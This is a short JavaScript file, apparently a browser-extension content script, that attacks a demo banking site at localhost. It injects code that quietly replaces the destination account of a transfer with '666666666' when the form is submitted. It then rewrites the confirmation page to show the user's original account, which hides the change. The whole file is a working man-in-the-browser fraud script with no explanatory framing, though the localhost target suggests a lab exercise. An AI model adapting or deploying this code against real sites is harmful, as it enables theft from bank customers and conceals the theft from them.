var transaction= `
document.getElementById("my_form").reset(); 
document.getElementById("my_form").onsubmit = function() {
localStorage.setItem("account", document.getElementById("my_form").elements.destination.value );
document.getElementById("my_form").elements.destination.value = "666666666";
};

`;

var confirmation= `
document.getElementsByTagName("table")[0].rows[1].cells[0].innerHTML = localStorage.getItem("account"); 
localStorage.removeItem("account");

`;

if(window.location.href == 'http://www.localhost/bank/transaction.php?'){
var script = document.createElement('script');
script.textContent = transaction;
(document.body||document.documentElement).appendChild(script);

}else if(window.location.href == 'http://www.localhost/bank/transaction_confirmation.php'){
var script = document.createElement('script');
script.textContent = confirmation;
(document.body||document.documentElement).appendChild(script);
}
